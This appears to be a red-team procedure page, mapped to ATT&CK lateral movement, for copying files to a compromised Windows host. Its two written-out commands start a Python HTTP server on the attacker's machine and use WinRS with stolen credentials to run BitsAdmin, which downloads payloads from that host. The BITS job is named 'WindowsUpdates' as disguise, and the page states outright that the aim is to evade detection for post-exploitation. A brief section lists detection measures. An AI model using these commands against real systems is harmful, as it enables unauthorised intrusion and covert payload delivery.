---
id: adc89bbb-a2f6-4305-99b4-a8ed05a92ee5
name: Copy-File-to-Remote-Windows-Host-Using-WinRS-and-BitsAdmin
type: procedure
verified: true
submitted: false
created_at: '2023-01-12T22:08:55.736455+00:00'
updated_at: '2023-05-29T16:48:53.253841+00:00'
tactics:
  - '[[tactics/Command and Control|TA0011 - Command and Control]]'
  - '[[tactics/Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
  - '[[techniques/Remote File Copy|T1105 - Remote File Copy]]'
sub_techniques: []
tags:
  - '[[tags/file transfer]]'
commands:
  - '[[commands/start-python-http-server]]'
  - '[[commands/winrs-execute-bitsadmin-download]]'
platforms:
  - Windows
tools: []
validated: true
---

# Copy-File-to-Remote-Windows-Host-Using-WinRS-and-BitsAdmin

## Summary

This procedure enables the transfer of a file to a remote Windows host by hosting the file on an HTTP server accessible to the target and using Windows Remote Shell (WinRS) to authenticate and execute BitsAdmin on the remote machine for downloading the file. It is useful in lateral movement scenarios where direct file copy methods are restricted, leveraging built-in Windows tools to avoid detection.

## Description

In offensive security operations, transferring files to compromised hosts is essential for deploying payloads, tools, or executables. This technique uses WinRS to remotely execute commands on a Windows target using valid credentials (user or admin level). The attacker first hosts the file via a simple HTTP server (e.g., Python's built-in module) on a machine reachable by the target. Then, WinRS triggers BitsAdmin—a legitimate Windows background transfer service—to download the file to a public directory like C:\Users\Public. This method blends with normal network traffic and uses native tools, making it stealthy. It requires the target to have network access to the HTTP server and WinRM (Windows Remote Management) enabled for WinRS. The procedure assumes the attacker has credentials for the remote host and is operating from a system with WinRS client capabilities.

## Requirements

1. Valid credentials (username and password) for a user account on the remote Windows host with sufficient privileges to execute commands via WinRS.
2. Network connectivity between the attacker's HTTP server and the remote host; the HTTP server must be accessible (e.g., same network or internet-exposed).
3. WinRM service enabled on the target Windows host (default on modern Windows servers; may require configuration on workstations).
4. Python 3 installed on the attacker's machine to host the HTTP server.
5. The file to transfer must be placed in the directory where the HTTP server is started.
6. BitsAdmin available on the target (built-in on Windows Vista and later).

## Defense

Defensive measures and detection strategies:

- Monitor WinRM logs (Event ID 91, 92 in Microsoft-Windows-WinRM/Operational) for unauthorized remote command execution.
- Enable PowerShell logging and Sysmon to track BitsAdmin process creation (Event ID 1) and network connections to unexpected HTTP servers.
- Implement application whitelisting (e.g., AppLocker) to restrict BitsAdmin usage or block downloads to public directories.
- Network segmentation to prevent lateral movement; use firewalls to block outbound HTTP to unauthorized servers.
- Alert on anomalous file creations in C:\Users\Public or other shared paths.

## Objectives

1. Host the target file on an accessible HTTP server to make it available for download.
2. Use WinRS to remotely execute BitsAdmin on the target host, downloading the file to a designated location.
3. Verify successful transfer without triggering alerts, enabling further post-exploitation activities.

## Instructions

### Step 1: Host the File on HTTP Server

**Context**: Start a simple HTTP server in the directory containing the file to be transferred. This makes the file available at http://<attacker_ip>:<port>/<filename>. Note the attacker's IP and choose a port (default 8000).

**Command** ([[commands/start-python-http-server]]):
```bash
python3 -m http.server $_PORT
```

> This command starts the server. Keep it running during the transfer. Expected output includes lines like "Serving HTTP at 0.0.0.0:8000". Access the file via browser from another machine to verify (e.g., http://<attacker_ip>:8000/$FILENAME shows the file).

### Step 2: Execute Remote Download via WinRS and BitsAdmin

**Context**: Using the remote host's credentials, execute a WinRS command to run BitsAdmin on the target. This downloads the file from the HTTP server to C:\Users\Public on the remote machine. Replace placeholders with actual values: $SERVER (target hostname/IP), $USER (username), $PASSWORD (password), $HTTP_SERVER (attacker IP:port), $FILENAME (file name).

**Command** ([[commands/winrs-execute-bitsadmin-download]]):
```bash
winrs -r:$SERVER -u:.$USER -p:$PASSWORD "bitsadmin /transfer WindowsUpdates /priority normal http://$HTTP_SERVER/$FILENAME c:\\Users\\Public\\$FILENAME"
```

> This authenticates via WinRS and runs BitsAdmin to create a job named "WindowsUpdates" for the transfer. The /priority normal ensures standard execution. Expected output shows progress like "BITS job started" and completion status. If successful, no errors; the file appears in the remote public folder. Decision point: If authentication fails (error like "Access denied"), verify credentials and WinRM config. If download fails, check firewall/network access.
